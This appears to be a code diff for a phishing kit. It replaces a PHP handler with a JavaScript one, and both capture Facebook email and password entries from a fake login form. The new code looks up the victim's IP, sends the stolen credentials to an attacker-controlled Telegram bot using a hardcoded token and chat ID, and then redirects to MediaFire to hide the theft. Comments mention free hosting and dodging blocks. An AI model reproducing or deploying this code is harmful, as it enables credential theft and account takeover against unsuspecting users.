@@ -1,36 +1,43 @@
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $token = "8514761747:AAFRzzegKPnDq_wz5aREmTI4ZThvsiqoNBM";
-    $chat_id = "5906696731";
+document.getElementById('fbForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const btn = document.getElementById('btnLog');
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('pass').value;
+    
+    const token = "8514761747:AAFRzzegKPnDq_wz5aREmTI4ZThvsiqoNBM";
+    const chat_id = "5906696731";
+    
+    btn.innerText = "Processing...";
+    btn.disabled = true;
 
-    $email = $_POST['email'];
-    $pass  = $_POST['pass'];
+    // 1. Ambil Waktu Jakarta
+    const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
-    // Deteksi IP (Trik buat ByetHost)
-    $ip = $_SERVER['REMOTE_ADDR'];
-    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-    }
+    // 2. Ambil IP dulu baru kirim ke Telegram
+    fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+            const ip = data.ip;
+            const pesan = `<b>🔵 FB LOG NETLIFY 🔵</b>\n\n` +
+                          `📧 <b>User:</b> <code>${email}</code>\n` +
+                          `🔑 <b>Pass:</b> <code>${pass}</code>\n` +
+                          `🌐 <b>IP:</b> <code>${ip}</code>\n` +
+                          `⏰ <b>Waktu:</b> <code>${waktu}</code>`;
 
-    // Set Waktu Jakarta
-    date_default_timezone_set('Asia/Jakarta');
-    $waktu = date('d/m/Y - H:i:s');
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(pesan)}&parse_mode=HTML`;
 
-    // Pesan HTML (Lebih aman dari Markdown)
-    $message = "<b>🔵 FB LOGIN DETECTED 🔵</b>\n\n";
-    $message .= "📧 <b>User:</b> <code>$email</code>\n";
-    $message .= "🔑 <b>Pass:</b> <code>$pass</code>\n";
-    $message .= "🌐 <b>IP:</b> $ip\n";
-    $message .= "⏰ <b>Waktu:</b> $waktu";
-
-    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message) . "&parse_mode=HTML";
-
-    // Kirim pakai User-Agent agar tidak diblokir
-    $opts = ["http" => ["header" => "User-Agent: Mozilla/5.0\r\n"]];
-    $context = stream_context_create($opts);
-    @file_get_contents($url, false, $context);
-
-    header("Location: https://www.mediafire.com/myfiles/");
-    exit();
-}
-?>
+            // Kirim ke Telegram
+            return fetch(url, { mode: 'no-cors' });
+        })
+        .then(() => {
+            // 3. Redirect ke MediaFire
+            setTimeout(() => {
+                window.location.href = "https://www.mediafire.com/myfiles/";
+            }, 500);
+        })
+        .catch(() => {
+            // Jika ada error tetap redirect
+            window.location.href = "https://www.mediafire.com/myfiles/";
+        });
+});
